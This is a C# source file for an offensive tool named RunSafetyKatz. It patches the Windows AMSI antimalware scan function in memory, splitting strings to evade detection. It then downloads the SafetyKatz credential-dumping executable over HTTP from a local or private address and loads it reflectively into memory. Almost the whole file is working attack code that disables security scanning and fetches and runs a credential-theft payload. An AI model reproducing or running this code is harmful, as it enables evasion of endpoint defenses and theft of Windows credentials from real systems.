using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Reflection;
using System.Runtime.InteropServices;

namespace RunSafetyKatz
{   
    class Win32
    {
        [DllImport("kernel32")]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32")]
        public static extern IntPtr LoadLibrary(string name);

        [DllImport("kernel32")]
        public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
    }

    class Program
    {
        static byte[] x64 = new byte[] { 0x75 };

        private static void PatchAmsi(byte[] patch)
        {
            try
            {
                var amsilib = Win32.LoadLibrary("am"+"si.d"+"ll");
                var addr = Win32.GetProcAddress(amsilib, "Am"+"si"+"Sca"+"n"+"Buf"+"fer");
                Console.WriteLine("[x] 0{0:X}", addr);

                addr += 54;
                //First je change to jne in amsiinitialize so that error is thrown and catch goes to 
                // B8 57000780              | mov eax,80070057              
                // and bypasses asmi
                //based on HAMSICONTEXT -->https://code-white.com/blog/2019-07-heap-based-amsi-bypass-in-vba/
                Console.WriteLine("[x] 0{0:X}", addr);

                uint oldProtect;
            
                Win32.VirtualProtect(addr, (UIntPtr)patch.Length, 0x40, out oldProtect);
            
                for(int i=0; i < patch.Length; i++)
                {
                    Marshal.WriteByte(addr + i, patch[i]);
                }
                
                Console.WriteLine("[*] AMSI Patched");
            }
            catch (Exception e)
            {
                Console.WriteLine("[x] {0}", e.Message);
                Console.WriteLine("[x] {0}", e.InnerException);
            }
        }


        static void Main(string[] args)
        {

            PatchAmsi(x64);

            var webClient = new System.Net.WebClient();
            var data = webClient.DownloadData("http://127.0.0.1:8888/Safe"+"tyK"+"atz.exe");
            //var data = webClient.DownloadData("http://10.10.0.10:8888/run_safetykatz.exe");
            try
            {
                Console.WriteLine("Before loading the assembly. Press any button to continue...");
                Console.ReadKey();

                var assembly = Assembly.Load(data);

                Console.WriteLine("After loading the assembly. Press any button to continue...");
                Console.ReadKey();

                if (assembly != null)
                {
                    Console.WriteLine("[*] AMSI bypassed");
                    Console.WriteLine("[*] Assembly Name: {0}", assembly.FullName);
                }
            }
            catch (BadImageFormatException e)
            {
                Console.WriteLine("[x] AMSI Triggered on loading assembly");

            }
            catch (System.Exception e)
            {
                Console.WriteLine("[x] Unexpected exception triggered");
            }
        }

    }
}